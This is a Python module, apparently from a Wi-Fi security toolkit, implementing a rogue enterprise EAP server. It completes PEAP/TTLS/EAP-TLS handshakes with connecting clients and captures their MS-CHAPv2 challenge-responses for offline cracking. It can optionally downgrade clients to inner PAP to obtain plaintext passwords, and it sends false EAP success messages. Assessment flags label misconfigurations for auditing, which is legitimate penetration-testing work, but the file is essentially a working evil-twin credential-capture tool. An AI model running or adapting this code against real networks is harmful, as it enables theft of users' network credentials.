"""EAP lab server: PEAP/TTLS MS-CHAPv2 capture and EAP-TLS client-certificate observation."""
from __future__ import annotations

import hashlib
import os
import ssl
import struct
from collections import deque
from dataclasses import dataclass, field

from wifit3.campaigns.eap_lab_assessment import is_empty_nt_response
from wifit3.campaigns.eap_lab_config import EapLabLaunchConfig
from wifit3.campaigns.eap_lab_tls import LabTlsMaterial
from wifit3.crack.mschapv2 import (
    MsChapV2Capture,
    attach_server_challenge,
    build_mschapv2_challenge,
    parse_mschapv2_eap_payload,
)
from wifit3.dot11.eap import (
    EAP_FAILURE,
    EAP_REQUEST,
    EAP_RESPONSE,
    EAP_TYPE_IDENTITY,
    EAP_TYPE_MSCHAPV2,
    EAP_TYPE_NAK,
    EAP_TYPE_PAP,
    EAP_TYPE_PEAP,
    EAP_TYPE_TLS,
    EAP_TYPE_TTLS,
    EAP_TLS_TYPES,
)
from wifit3.dot11.eapol import LLC_SNAP_EAPOL
from wifit3.dot11.enterprise import eap_tls_fragment


_TLS_FRAGMENT_BYTES = 900
_MAX_TLS_BYTES = 1_048_576
_TUNNELED_METHODS = frozenset({EAP_TYPE_PEAP, EAP_TYPE_TTLS})


def _identity_payload(packet) -> bytes:
    payload = getattr(packet, "eap_data", b"")
    if payload:
        return payload
    raw = getattr(packet, "raw", b"")
    marker = raw.find(LLC_SNAP_EAPOL)
    if marker < 0:
        return b""
    eap_start = marker + len(LLC_SNAP_EAPOL) + 4
    if len(raw) < eap_start + 5 or raw[eap_start + 4] != EAP_TYPE_IDENTITY:
        return b""
    eap_length = int.from_bytes(raw[eap_start + 2:eap_start + 4], "big")
    return bytes(raw[eap_start + 5:min(eap_start + eap_length, len(raw))])


@dataclass(slots=True)
class PeapServerResult:
    outgoing: list[bytes] = field(default_factory=list)
    capture: MsChapV2Capture | None = None
    complete: bool = False
    failed: bool = False
    client_cert_fingerprint: str | None = None
    eap_method: int | None = None
    detail: str = ""
    misconfiguration: str | None = None
    rejected_lab: bool = False


class _TlsServer:
    def __init__(self, material: LabTlsMaterial) -> None:
        context = material.server_context()
        self._incoming = ssl.MemoryBIO()
        self._outgoing = ssl.MemoryBIO()
        self.ssl = context.wrap_bio(self._incoming, self._outgoing, server_side=True)
        self.complete = False
        self.error: str | None = None

    def feed(self, incoming: bytes = b"") -> bytes:
        if incoming:
            self._incoming.write(incoming)
        if not self.complete:
            try:
                self.ssl.do_handshake()
                self.complete = True
            except ssl.SSLError as exc:
                if exc.reason not in ("WRONG_VERSION_NUMBER", "UNEXPECTED_EOF_WHILE_READING"):
                    if isinstance(exc, ssl.SSLSyscallError):
                        self.error = str(exc)
                    elif not isinstance(exc, ssl.SSLWantReadError | ssl.SSLWantWriteError):
                        self.error = str(exc)
            except ssl.SSLSyscallError as exc:
                self.error = str(exc)
        return self._drain_outgoing()

    def write_app(self, payload: bytes) -> bytes:
        try:
            self.ssl.write(payload)
        except ssl.SSLError as exc:
            if not isinstance(exc, ssl.SSLWantReadError | ssl.SSLWantWriteError):
                self.error = str(exc)
        return self._drain_outgoing()

    def read_app(self) -> bytes:
        try:
            return self.ssl.read(8192)
        except ssl.SSLError as exc:
            if isinstance(exc, ssl.SSLWantReadError | ssl.SSLWantWriteError):
                return b""
            self.error = str(exc)
            return b""

    def peer_cert_fingerprint(self) -> str | None:
        if not self.complete:
            return None
        try:
            der = self.ssl.getpeercert(binary_form=True)
        except (ValueError, ssl.SSLError):
            der = None
        if not der:
            return None
        return hashlib.sha256(der).hexdigest()

    def _drain_outgoing(self) -> bytes:
        chunks = []
        while self._outgoing.pending:
            chunks.append(self._outgoing.read())
        return b"".join(chunks)


class EapLabServerSession:
    """Outer EAP for PEAP/TTLS (MS-CHAPv2) and EAP-TLS client-certificate observation."""

    def __init__(
        self,
        material: LabTlsMaterial,
        *,
        eap_methods: tuple[int, ...] = (EAP_TYPE_PEAP, EAP_TYPE_TTLS, EAP_TYPE_TLS),
        launch: EapLabLaunchConfig | None = None,
    ) -> None:
        self._material = material
        self._launch = launch or EapLabLaunchConfig(timeout=300)
        self._method_queue = deque(
            method for method in eap_methods if method in EAP_TLS_TYPES
        )
        if not self._method_queue:
            self._method_queue = deque([EAP_TYPE_PEAP])
        self._active_method: int | None = None
        self._tls: _TlsServer | None = None
        self._next_eap_id = 1
        self._mschap_id = 0
        self._server_challenge = b""
        self._inner_username = ""
        self._inner_buffer = bytearray()
        self._incoming_tls = bytearray()
        self._tunnel_ready = False
        self._sent_mschap_challenge = False
        self._offered_inner_pap = False
        self._peap_version_flags = 0

    def on_eapol_start(self, bssid: bytes, client: bytes) -> PeapServerResult:
        return self._send_identity_request(bssid, client)

    def on_eap(self, bssid: bytes, client: bytes, packet) -> PeapServerResult:
        if packet.eap_code == EAP_RESPONSE and packet.eap_type == EAP_TYPE_IDENTITY:
            identity = _identity_payload(packet).decode("utf-8", errors="replace").strip()
            self._inner_username = identity
            return self._start_next_method(bssid, client)
        if packet.eap_code == EAP_RESPONSE and packet.eap_type == EAP_TYPE_NAK:
            if self._method_queue:
                return self._start_next_method(bssid, client)
            return PeapServerResult(failed=True, detail="no supported EAP method")
        if (
            packet.eap_code == EAP_RESPONSE
            and self._active_method is not None
            and packet.eap_type == self._active_method
        ):
            if self._active_method in _TUNNELED_METHODS:
                return self._handle_tunneled_tls(bssid, client, packet)
            if self._active_method == EAP_TYPE_TLS:
                return self._handle_eap_tls(bssid, client, packet)
        if packet.eap_code == EAP_FAILURE:
            return PeapServerResult(failed=True)
        return PeapServerResult()

    def _start_next_method(self, bssid: bytes, client: bytes) -> PeapServerResult:
        if not self._method_queue:
            return PeapServerResult(failed=True, detail="EAP method negotiation exhausted")
        self._active_method = self._method_queue.popleft()
        self._tls = _TlsServer(self._material)
        self._tunnel_ready = False
        self._sent_mschap_challenge = False
        self._inner_buffer.clear()
        from wifit3.dot11.eap import eap_tls_request_frame

        ident = self._next_eap_id
        self._next_eap_id = (self._next_eap_id + 1) & 0xFF
        return PeapServerResult(
            outgoing=[
                eap_tls_request_frame(
                    bssid,
                    client,
                    ident,
                    self._active_method,
                    start=True,
                ),
            ],
            eap_method=self._active_method,
        )

    def _send_identity_request(self, bssid: bytes, client: bytes) -> PeapServerResult:
        from wifit3.dot11.eap import eap_request_frame

        ident = self._next_eap_id
        self._next_eap_id = (self._next_eap_id + 1) & 0xFF
        return PeapServerResult(
            outgoing=[eap_request_frame(bssid, client, ident, EAP_TYPE_IDENTITY)],
        )

    def _handle_eap_tls(self, bssid: bytes, client: bytes, packet) -> PeapServerResult:
        fed = self._feed_tls(packet)
        if self._tls is None:
            return PeapServerResult(failed=True)
        if self._tls.complete:
            fingerprint = self._tls.peer_cert_fingerprint()
            from wifit3.dot11.eap import eap_success_frame

            detail = "EAP-TLS completed"
            if fingerprint:
                detail += f"; client cert SHA-256 {fingerprint[:16]}…"
            return PeapServerResult(
                outgoing=[eap_success_frame(bssid, client, packet.eap_identifier)],
                complete=True,
                client_cert_fingerprint=fingerprint,
                eap_method=EAP_TYPE_TLS,
                detail=detail,
                misconfiguration=(
                    "untrusted_server_eap_tls"
                    if self._launch.security_assessment
                    else None
                ),
            )
        if self._tls.error:
            return PeapServerResult(
                failed=True,
                detail=self._tls.error,
                rejected_lab=self._launch.security_assessment,
            )
        if fed.outgoing_tls:
            return PeapServerResult(
                outgoing=self._wrap_tls_eap(
                    bssid,
                    client,
                    packet.eap_identifier,
                    fed.outgoing_tls,
                ),
                eap_method=EAP_TYPE_TLS,
            )
        return PeapServerResult(eap_method=EAP_TYPE_TLS)

    def _handle_tunneled_tls(self, bssid: bytes, client: bytes, packet) -> PeapServerResult:
        if self._tls is None or self._active_method is None:
            return PeapServerResult(failed=True)
        if packet.eap_data:
            self._peap_version_flags = packet.eap_data[0] & 0x1F
        fed = self._feed_tls(packet)
        outgoing_tls = fed.outgoing_tls
        if self._tls.complete and not self._tunnel_ready:
            self._tunnel_ready = True
            inner_result = self._send_inner_identity_request(bssid, client, packet.eap_identifier)
            if inner_result.outgoing:
                return inner_result
        if self._tunnel_ready:
            inner = self._tls.read_app()
            if inner:
                inner_result = self._consume_inner(bssid, client, packet.eap_identifier, inner)
                if inner_result.capture or inner_result.failed or inner_result.complete:
                    return inner_result
        if outgoing_tls:
            frames = self._wrap_tls_eap(
                bssid,
                client,
                packet.eap_identifier,
                outgoing_tls,
            )
            return PeapServerResult(outgoing=frames, eap_method=self._active_method)
        return PeapServerResult(eap_method=self._active_method)

    @dataclass(slots=True)
    class _TlsFeed:
        outgoing_tls: bytes = b""

    def _feed_tls(self, packet) -> _TlsFeed:
        if self._tls is None:
            return self._TlsFeed()
        more, start, total_length, fragment = eap_tls_fragment(packet.eap_data)
        if total_length is not None and total_length > _MAX_TLS_BYTES:
            self._tls.error = "TLS payload too large"
            return self._TlsFeed()
        if start or total_length is not None:
            self._incoming_tls.clear()
        if len(self._incoming_tls) + len(fragment) > _MAX_TLS_BYTES:
            self._tls.error = "TLS reassembly too large"
            return self._TlsFeed()
        self._incoming_tls.extend(fragment)
        if more:
            return self._TlsFeed()
        incoming = bytes(self._incoming_tls)
        self._incoming_tls.clear()
        outgoing = self._tls.feed(incoming)
        return self._TlsFeed(outgoing_tls=outgoing)

    def _send_inner_identity_request(
        self,
        bssid: bytes,
        client: bytes,
        outer_ident: int,
    ) -> PeapServerResult:
        inner = self._build_inner_eap(EAP_REQUEST, EAP_TYPE_IDENTITY)
        outgoing_tls = self._tls.write_app(inner) if self._tls else b""
        frames = self._wrap_tls_eap(bssid, client, outer_ident, outgoing_tls)
        return PeapServerResult(outgoing=frames, eap_method=self._active_method)

    def _consume_inner(
        self,
        bssid: bytes,
        client: bytes,
        outer_ident: int,
        data: bytes,
    ) -> PeapServerResult:
        self._inner_buffer.extend(data)
        for packet in self._iter_inner_packets():
            if packet[0] != EAP_RESPONSE:
                continue
            eap_type = packet[4] if len(packet) >= 5 else None
            if eap_type == EAP_TYPE_IDENTITY:
                self._inner_username = packet[5:].split(b"\x00", 1)[0].decode(
                    "utf-8",
                    errors="replace",
                ).strip() or self._inner_username
                if (
                    self._launch.security_assessment
                    and self._launch.probe_inner_pap
                    and not self._offered_inner_pap
                ):
                    self._offered_inner_pap = True
                    return self._send_inner_pap_request(bssid, client, outer_ident)
                return self._send_mschap_challenge(bssid, client, outer_ident)
            if eap_type == EAP_TYPE_PAP:
                return self._handle_inner_pap(bssid, client, outer_ident, packet[5:])
            if eap_type == EAP_TYPE_NAK and self._offered_inner_pap:
                return self._send_mschap_challenge(bssid, client, outer_ident)
            if eap_type == EAP_TYPE_MSCHAPV2:
                capture = parse_mschapv2_eap_payload(packet[5:])
                if capture is None:
                    return PeapServerResult(failed=True)
                capture = attach_server_challenge(capture, self._server_challenge)
                from wifit3.dot11.eap import eap_success_frame

                misconfig = None
                if self._launch.security_assessment:
                    if (
                        self._launch.probe_empty_mschap
                        and is_empty_nt_response(capture.nt_response)
                    ):
                        misconfig = "empty_mschap_accepted"
                    else:
                        misconfig = "untrusted_server_mschapv2"
                return PeapServerResult(
                    outgoing=[eap_success_frame(bssid, client, outer_ident)],
                    capture=capture,
                    complete=True,
                    eap_method=self._active_method,
                    misconfiguration=misconfig,
                )
        return PeapServerResult()

    def _send_inner_pap_request(
        self,
        bssid: bytes,
        client: bytes,
        outer_ident: int,
    ) -> PeapServerResult:
        inner = self._build_inner_eap(EAP_REQUEST, EAP_TYPE_PAP)
        outgoing_tls = self._tls.write_app(inner) if self._tls else b""
        frames = self._wrap_tls_eap(bssid, client, outer_ident, outgoing_tls)
        return PeapServerResult(outgoing=frames, eap_method=self._active_method)

    def _handle_inner_pap(
        self,
        bssid: bytes,
        client: bytes,
        outer_ident: int,
        pap_payload: bytes,
    ) -> PeapServerResult:
        from wifit3.dot11.eap import eap_success_frame

        password = pap_payload.decode("utf-8", errors="replace")
        detail = "inner PAP accepted by client"
        if not password.strip():
            detail = "inner PAP accepted with empty password"
        return PeapServerResult(
            outgoing=[eap_success_frame(bssid, client, outer_ident)],
            complete=True,
            eap_method=self._active_method,
            detail=detail,
            misconfiguration=(
                "inner_pap_accepted"
                if self._launch.security_assessment
                else None
            ),
        )

    def _send_mschap_challenge(
        self,
        bssid: bytes,
        client: bytes,
        outer_ident: int,
    ) -> PeapServerResult:
        if self._sent_mschap_challenge:
            return PeapServerResult()
        self._sent_mschap_challenge = True
        self._mschap_id = (self._mschap_id + 1) & 0xFF
        self._server_challenge = os.urandom(16)
        body = build_mschapv2_challenge(self._mschap_id, self._server_challenge)
        inner = self._build_inner_eap(EAP_REQUEST, EAP_TYPE_MSCHAPV2, body)
        outgoing_tls = self._tls.write_app(inner) if self._tls else b""
        frames = self._wrap_tls_eap(bssid, client, outer_ident, outgoing_tls)
        return PeapServerResult(outgoing=frames, eap_method=self._active_method)

    def _build_inner_eap(self, code: int, eap_type: int, data: bytes = b"") -> bytes:
        ident = self._next_eap_id
        self._next_eap_id = (self._next_eap_id + 1) & 0xFF
        body = bytes([eap_type]) + data
        return struct.pack(">BBH", code, ident, 4 + len(body)) + body

    def _iter_inner_packets(self):
        while len(self._inner_buffer) >= 4:
            if self._inner_buffer[0] == 0 and len(self._inner_buffer) > 4:
                self._inner_buffer.pop(0)
                continue
            length = struct.unpack(">H", self._inner_buffer[2:4])[0]
            if length < 4 or len(self._inner_buffer) < length:
                break
            packet = bytes(self._inner_buffer[:length])
            del self._inner_buffer[:length]
            yield packet

    def _wrap_tls_eap(
        self,
        bssid: bytes,
        client: bytes,
        identifier: int,
        payload: bytes,
        *,
        start: bool = False,
    ) -> list[bytes]:
        from wifit3.dot11.eap import eap_tls_request_frame

        if not payload and not start:
            return []
        if self._active_method is None:
            return []
        frames: list[bytes] = []
        offset = 0
        total = len(payload)
        while offset < total or (start and not frames):
            chunk = payload[offset: offset + _TLS_FRAGMENT_BYTES]
            offset += len(chunk)
            more = offset < total
            first = not frames
            frames.append(
                eap_tls_request_frame(
                    bssid,
                    client,
                    identifier,
                    self._active_method,
                    chunk,
                    more=more,
                    start=start and first and not chunk,
                    total_length=total if first and total else None,
                ),
            )
            if start and first and not chunk:
                break
        return frames


PeapServerSession = EapLabServerSession
